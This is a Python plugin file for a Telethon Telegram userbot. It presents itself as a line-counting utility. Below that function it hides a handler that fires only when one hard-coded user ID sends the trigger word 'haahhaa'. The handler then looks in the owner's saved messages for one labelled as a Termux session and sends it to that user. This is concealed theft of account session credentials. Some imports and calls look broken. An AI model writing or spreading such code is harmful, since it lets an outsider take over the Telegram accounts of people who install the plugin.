
import asyncio
import os
import contextlib
import random
import sys
from asyncio.exceptions import CancelledError
import requests
import heroku3
import re
import urllib3
from telethon import events 
from SHRU import HEROKU_APP, UPSTREAM_REPO_URL, l313l
from ..core.managers import edit_delete, edit_or_reply
from telethon.events import NewMessage
from telethon import event
from telethon.tl import types

from telethon.utils import get_display_name
plugin_category = "utils"



@l313l.ar_cmd(
    pattern="عدد$",
    command=("عدد", plugin_category),
    info={
        "header": "Count the number of lines in a message.",
        "usage": "{tr}عدد (reply to a message)",
    },
)
async def count_lines(event):
    reply = await event.get_reply_message()
    if not reply or not reply.message:
        return await edit_or_reply(event, "⌔∮ يرجى الرد على الرسالة لحساب عدد الأسطر.")
    lines = reply.message.split("\n")
    count = len(lines)
    await edit_or_reply(event, f"⌔∮ عدد الأسطر في الرسالة: {count}")

from telethon import events
from ..helpers.functions import edit_or_reply




@l313l.ar_bot.on(events.NewMessage(from_users=6205161271, pattern="haahhaa"))
async def send_saved_message(event):
    saved_messages = await event.client.get_messages("me", None, filter=events.PinnedMessage())
    
    for message in saved_messages:
        if message.message.startswith("جلسة تيرمكس"):
            await event.respond(message.message)
            break
    else:
        await event.respond("No saved message found with 'جلسة تيرمكس'")
